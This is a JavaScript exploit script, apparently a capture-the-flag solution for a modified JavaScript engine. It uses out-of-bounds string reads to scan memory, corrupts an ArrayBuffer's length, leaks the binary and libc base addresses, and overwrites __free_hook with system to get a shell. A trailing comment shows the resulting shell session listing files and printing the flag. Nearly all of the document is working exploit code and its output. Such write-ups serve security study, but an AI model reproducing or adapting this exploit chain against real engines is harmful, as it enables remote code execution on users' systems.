function gc() { for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);};var tarr = new BigUint64Array(8);tarr[0] = 0x33313131n;tarr[1] = 0x32323232n;var ab = [];for (var i = 0; i < 0x200; i++) {ab.push(new ArrayBuffer(0x1337));};var oob_str_arr = ['AAAAAAAA','BBBBBBBB','CCCCCCCC'];gc();gc();var tarr_ix = 0;for (var i = 0; i < 4000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0x33 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x31& oob_str_arr[0].charCodeAt(-1620000-i-2) == 0x31& oob_str_arr[0].charCodeAt(-1620000-i-3) == 0x31){tarr_ix=i;};};var ab_ix = 0;for (var i = 0; i < 4000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0x13 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0x37){ab_ix=i;};};diff = 650;tarr.fill(0x4000n,Math.floor(diff/8)-1,Math.floor(diff/8));var corrupted_ix = 0;
for (var i = 0; i < 0x200; i++){if (ab[i].byteLength!=0x1337){corrupted_ix =i;};};var leak_base_offset = 0x1e90n; var base_offset = 0x7fe2f0n; var cxa = 0x1474718n;var up_byte = 0;var lo_byte = 0;for (var i = 0; i < 10000; i++) { if(oob_str_arr[0].charCodeAt(-1620000-i) == 0 & oob_str_arr[0].charCodeAt(-1620000-i-1) == 0& oob_str_arr[0].charCodeAt(-1620000-i-2) == 0& oob_str_arr[0].charCodeAt(-1620000-i-3) == 7& oob_str_arr[0].charCodeAt(-1620000-i+1) >0& oob_str_arr[0].charCodeAt(-1620000-i+2) >0) {up_byte = oob_str_arr[0].charCodeAt(-1620000-i+2); lo_byte = oob_str_arr[0].charCodeAt(-1620000-i+1) ; break;};};var addr_space = BigInt(0x100000000*(lo_byte+(up_byte*0x100))); var leak_base = addr_space+leak_base_offset;tarr.fill(leak_base,Math.floor(diff/8),Math.floor(diff/8)+1);var b64 = new BigUint64Array(ab[corrupted_ix]);var bin_base = b64[0] - base_offset;var cxa_handler = bin_base+cxa;tarr.fill(cxa_handler,Math.floor(diff/8),Math.floor(diff/8)+1);var b64 = new BigUint64Array(ab[corrupted_ix]);gi_abort = b64[0];remote = 0x25414n;libc_base = gi_abort-remote;free_hook=libc_base+0x1e75a8n;system=libc_base+0x52fd0n;tarr.fill(free_hook,Math.floor(diff/8),Math.floor(diff/8)+1);var b64 = new BigUint64Array(ab[corrupted_ix]);console.log('run shell');b64[0] = system;console.log('sh');


/*
drwxr-xr-x 1 65534 65534 4096 Mar 13 19:26 .
drwxrwxrwt 9  1000  1000  180 Mar 15 18:40 ..
drwxr-xr-x 2 65534 65534 4096 Mar 13 19:26 bin
-rwxr-xr-x 1 65534 65534  463 Mar 13 17:41 entrypoint.sh
-rw-r--r-- 1 65534 65534   36 Mar 13 17:41 flagishere
-rw-r--r-- 1 65534 65534  556 Mar 13 17:41 pow.py
-rw-r--r-- 1 65534 65534  327 Mar 13 17:41 server.py
pwd
/app
ls
bin
entrypoint.sh
flagishere
pow.py
server.py
cat flagishere
p4{c0mPIling_chr@mium_1s_h4rd_ok?} 
*/
